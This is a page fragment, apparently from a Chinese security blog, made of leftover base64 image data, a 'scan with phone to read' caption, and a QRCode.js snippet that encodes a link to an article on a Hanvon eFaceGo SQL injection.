5ro5EZKzTr0jJKduHkYdwmFE6/Z4vyH703iD68PXEPfktOVi1+WQ6XduHcSHYM9BdPOiObkIx7xZcZXVh2OPqrnqmxNh7Afh+tW7Vuelue43xJN4E9y+hjg10f1Bptw5RIegvmgfseuQOn3RHMSHYPdnObWOq9qVDtfvCckC/bbbz1QHownAx3eBwP3vIY83+7j8VxZkiv2p6hySg6CfrzkYdQiHYM9b1/XOKwfpAcHSasGcQ3QI2rNj9Xi2zPcMpC8E9Vf58i8PxCY3/rcnsH2XBZmit4Pwmtp+wahDuHX7bF2rr7AytfTruhaMfSEcgpWpBeGALTYEPv5urlwtjbqu1Tkkrw7h8BzNd6x71FKH9JGLEB24v4Y83uxj+y6r76smW0sdMsXSaql3hOTUIRyC6tWjFkSv61r6K6xMrZV/RYf5Pavvfq167TP7a0hfGHGfqWuIb//SXPfXEE/lTXD7GnJ1PzCfrvVOGsacfseeh9R1Xb6q1y/sGTmkt1yE6DBi9aplToQxB+H6K4QxB+Hwhfcbsjq9F+mHgcDXtIBtW/Wk7JcG8K3vZHodpF7de0B0uX5HSA7YrF4DfOxxCywuep2xM/3M/06fw0AsvvE1J3D5uyy3B8+fNpj7MNd9ukRIrvN+f0hOvRCiQbC0Wvaq6/2C5PQh3AyEQ9DcylcXIXUwYu9jvvB+Q+oU3mht32U5NXG1x5UPeQq6f8a9D6T+KrfvDO2hB2PvlW+++3IY+6zy6qL1Z7xy9xtSp/BGa/saApk+XEM/B6cuQur14XvcOvt11Bch/QGlDYHhu6tVL3VIXr41+rxQFz/lA0D6dANGHcLhC+83pJ/ai/k2EKd+hqv9QqasDyO3r/5VhLFPr7NvYffk5dWCsReEQ7AytSB8VQ/xIWhOrB615GJptTovzbUNxNCNrz2Bw0AgU4cRV9uE5Fb+n+ow9oU5h+jwhd7Tp65zSPZM14cxr94RkoMRz3J7/zCQvXlf//wJ/LWB9KfRT0Ud8tSoi/pXuTnR+j3qQe4JQfUztBekTm6dfIU9Jxd7HeQ+wP0vho83+/hrbwhkyk5/9Xnqi5C6VR7im+84q+sZOaTXrGavwTzX+8CYg/Ce69x7QfLywr82kGp2r39/AoeBOM2Oq1utcupwfAqqF0Q3J0L0yuwXRIegHoTDEXvGe3SE1HZd3vvIu68O6Sdf4az+MJBV8a3/zAlsA4FMFZ7j2bZgrO9PAcRf6b1/z+nD2MfcHiGZXtO5NZA8zNE6EZKTi/aTd4TUQXDvbwPZi/f1607gHsjrzn565/8BAAD//3yha0IAAAAGSURBVAMAXLtn6Q3YbTkAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 